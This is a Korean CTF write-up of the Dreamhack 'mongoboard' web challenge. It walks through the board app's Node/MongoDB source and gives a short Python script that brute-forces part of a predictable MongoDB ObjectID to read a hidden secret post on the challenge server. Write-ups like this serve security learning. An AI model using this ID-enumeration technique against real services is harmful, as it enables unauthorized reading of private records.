---
title: "드림핵 lv.1 - mongoboard"
date: 2025-03-15 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking] 
description: 드림핵 mongoboard 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/128](https://dreamhack.io/wargame/challenges/128)
# 문제 설명
node와 mongodb로 구성된 게시판입니다.  
비밀 게시글을 읽어 FLAG를 획득하세요.

- MongoDB < 4.0.0

---
# 문제 풀이
## 웹사이트 분석
### / 메인 페이지
![mongoboard main](https://1drv.ms/i/c/5cb37aa515b56a00/IQSFzxEucohbRZ6bk5DVJzbnAWzumBQRznVK2Kf105jfGPU?width=660)<br />
해당 웹 사이트는 게시판 서비스를 제공한다. <br />
그래서 메인 페이지에 접속하면 유저들이 남긴 글의 목록들이 출력되고 각 글을 누르면 상세 정보를 볼 수 있는 페이지로 넘어가는 방식이다.
### /write 페이지
![mongoboard detail](https://1drv.ms/i/c/5cb37aa515b56a00/IQRltcCjZZMmQLI39zGu3fVoARUq55O5-tvgzQpue89oIIo?width=660)<br />
여기서는 글을 입력할 수 있다. <br />
제목과 이름 그리고 글의 내용을 입력하여 save 버튼을 누르면 제출되는 형식이다.<br/ >
해당 글을 secret으로 설정할 수 있는 옵션도 있는데 secret으로 설정하면 업로드한 본인 조차 접근할 수 없는 글이 된다.
## 코드 분석
### app.js
```js
var express     = require('express');
var app         = express();
var bodyParser  = require('body-parser');
var mongoose    = require('mongoose');
var path        = require('path');

// Connect to MongoDB
var db = mongoose.connection;
db.on('error', console.error);
db.once('open', function(){
    console.log("Connected to mongod server");
});
mongoose.connect('mongodb://localhost/mongoboard');

// model
var Board = require('./models/board');

// app Configure
app.use('/static', express.static(__dirname + '/public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.all('/*', function(req, res, next) {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// router
var router = require(__dirname + '/routes')(app, Board);
app.get('/', function(req, res) {
    res.sendFile(path.join(__dirname + '/index.html'));
});

// run
var port = process.env.PORT || 8080;
var server = app.listen(port, function(){
 console.log("Express server has started on port " + port)
});
```
해당 웹서비스는 express.js로 개발 됐고 문제 설명에 언급됐듯이 MongoDB를 사용한다.<br />
중간에 app.all() 함수로 모든 origin들을 허용하고 웬만한 HTTP 요청 방식도 허용하고 있는 것이 보인다. 여기서 취약점이 발생할 것으로 보인다.
### index.js
```js
module.exports = function(app, MongoBoard){
    app.get('/api/board', function(req,res){
        MongoBoard.find(function(err, board){
            if(err) return res.status(500).send({error: 'database failure'});
            res.json(board.map(data => {
                return {
                    _id: data.secret?null:data._id,
                    title: data.title,
                    author: data.author,
                    secret: data.secret,
                    publish_date: data.publish_date
                }
            }));
        })
    });

    app.get('/api/board/:board_id', function(req, res){
        MongoBoard.findOne({_id: req.params.board_id}, function(err, board){
            if(err) return res.status(500).json({error: err});
            if(!board) return res.status(404).json({error: 'board not found'});
            res.json(board);
        })
    });

    app.put('/api/board', function(req, res){
        var board = new MongoBoard();
        board.title = req.body.title;
        board.author = req.body.author;
        board.body = req.body.body;
        board.secret = req.body.secret || false;

        board.save(function(err){
            if(err){
                console.error(err);
                res.json({result: false});
                return;
            }
            res.json({result: true});

        });
    });
}
```
이 파일을 살펴보면 /api/board/게시판id 페이지에 접속해보면 해당 게시판의 정보를 얻어낼 수 있는 것 같다.<br />

하지만 비밀 게시글은 게시판id가 가려져 있기 때문에 다른 방식으로 알아내야 한다.
## 최종 풀이
### 취약점 분석
생각해보니까 어려운 방식을 쓰기 보다는 Brute Forcing으로 해결이 가능해보인다.<br />

계속해서 dummy 글을 만들다보면 MongoDB에서 자동으로 생성되는 게시글id에 어떠한 패턴이 보이기 시작한다.<br />
```
67d4d51d8b9e9b0171c413c3
67d4d51f8b9e9b0171c413c4
FLAG
67d4d5288b9e9b0171c413c6
```
이런식으로 생성이 된다.<br />
여기서 맨 마지막 숫자 2개는 순차적으로 올라가고있다. c3, c4, c5(보이지는 않지만 예상하기로는), 그리고 c6.<br />
다음으로는 7, 8번째 숫자를 보면 1d, 1f, 28 이런식으로변하고 있다. <br />
여기서 특정 패턴을 찾아보려 했지만 내 능력으로는 불가능했다. 그래서 그냥 Brute Force 방식으로 0부터 ff까지 가능한 모든 패턴을 시도해보았다.<br />
### 익스플로잇
```python
import requests

url = "http://host3.dreamhack.games:11209/api/board/"

for i in range(0x10, 0xff):
    id = "67d4d5" + hex(i)[2:4] + "8b9e9b0171c413c5"
    resp = requests.get(url + id)
    print(resp.text)
```
이렇게 고정된 문자들은 그대로 두고 중간에 2글자만 바꿔가면서 계속 요청을 보내봤다.<br />
계속 반복문을 돌다가 id가 일치할때 플래그를 출력한다.<br />

참고로 반복을 0x10부터 시작한 이유는 그냥 0x0 ~ 0x9까지 0x00, 0x01 이런식으로 변환하는 법을 알아보기 귀찮아서 그냥 0x10부터 시작했다.<br />

![mongodb result](https://1drv.ms/i/c/5cb37aa515b56a00/IQQKTL-riRDuT5DZsn3as8MZASoEIe0C8_RYYsVGeFT8yQM?width=660)<br />
# 배운 것
MongoDB의 `_id` 값은 일종의 생성 패턴이 존재한다는 것을 익힐 수 있었다.